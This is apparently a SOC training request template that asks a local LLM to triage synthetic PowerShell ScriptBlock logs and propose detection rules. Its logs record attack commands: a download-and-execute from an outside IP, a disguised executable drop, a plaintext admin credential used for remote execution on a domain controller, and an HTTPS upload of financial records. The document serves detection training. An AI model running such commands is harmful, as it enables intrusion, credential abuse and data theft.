# AI Request (Template v1.0)

## 1. Metadata
- **Request ID:** 20261106-w2-win-powershell-analysis
- **Date (UTC):** 2026-11-06T09:15:00Z
- **Week:** Week 2 (Log Analysis, Triage and Detection)
- **Task Type:** Windows PowerShell ScriptBlock Analysis & Timeline

## 2. Execution Assignment
- **Requester:** Mahmoud (Role 1: Windows & Endpoint Operator)
- **Assigned Runner:** Mahmoud (Main Runner - Windows & Endpoint)
- **Backup Runner:** Adam
- **Target Model:** llama3.1:8b (Q4_K_M)
- **Parameters:** num_ctx=8192, temperature=0.2, seed=42, system_prompt=None

## 3. Evidence Manifest
- **Source File(s):** evidence/W2_mahmoud_windows-powershell_2026-11-06T0900Z.log
- **SHA-256 Hash:** 657D5AAAE0B9AEA7CBA36F1B8AC825964D26096BBC17429A877420F721AFDB63
- **Chunk Size:** Full log chunk (< 8192 tokens)

## 4. Prompt (SOC Analyst Prompt v1.0)
You are a Senior SOC Analyst assisting with Incident Response for NileTech Financial Services.
Strict Rules:
1. Base every finding strictly on the provided log lines. Do not invent or assume facts not present in the logs.
2. Cite the exact [LINE-XX] and ISO 8601 UTC timestamp for every event mentioned.
3. Structure your response into:
   - Executive Summary
   - Chronological Timeline (UTC)
   - Extracted IOCs & Artifacts
   - Detection Improvement Suggestions

Task Instructions:
Analyze the Windows PowerShell ScriptBlock logs (EventID 4104). Identify C2 download staging, credential usage for remote execution via Invoke-Command, and data exfiltration over HTTPS. Cite exact [LINE-XX] and UTC timestamps for every claim, extract all IOCs (IPs, URLs, credentials, files), and propose 2 PowerShell detection rules.

Raw Evidence Logs:
--- BEGIN LOGS ---
[LINE-01] 2026-11-06T08:31:06Z | Host: WS-FIN-01 | User: NILETECH\sara.ahmed | EventID: 4104 | ScriptBlockID: 9a8b7c | Level: Warning | ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.45/stage1.ps1')
[LINE-02] 2026-11-06T08:33:18Z | Host: WS-FIN-01 | User: NILETECH\sara.ahmed | EventID: 4104 | ScriptBlockID: 4f5e6d | Level: Warning | ScriptBlockText: Invoke-WebRequest -Uri "http://185.220.101.45/svchost_update.exe" -OutFile "C:\Users\Public\Music\svchost_update.exe"
[LINE-03] 2026-11-06T08:40:50Z | Host: WS-FIN-01 | User: NILETECH\sara.ahmed | EventID: 4104 | ScriptBlockID: 1c2d3e | Level: Warning | ScriptBlockText: $secpasswd = ConvertTo-SecureString "P@ssw0rd_Admin99!" -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential ("NILETECH\admin_backup", $secpasswd); Invoke-Command -ComputerName DC-NILE-01 -Credential $cred -ScriptBlock { whoami; hostname }
[LINE-04] 2026-11-06T08:48:12Z | Host: WS-FIN-01 | User: NILETECH\sara.ahmed | EventID: 4104 | ScriptBlockID: 7e8f9a | Level: Warning | ScriptBlockText: Invoke-RestMethod -Uri "https://185.220.101.45:8443/upload" -Method Post -InFile "C:\Users\Public\fin_records_exfil.7z"

--- END LOGS ---
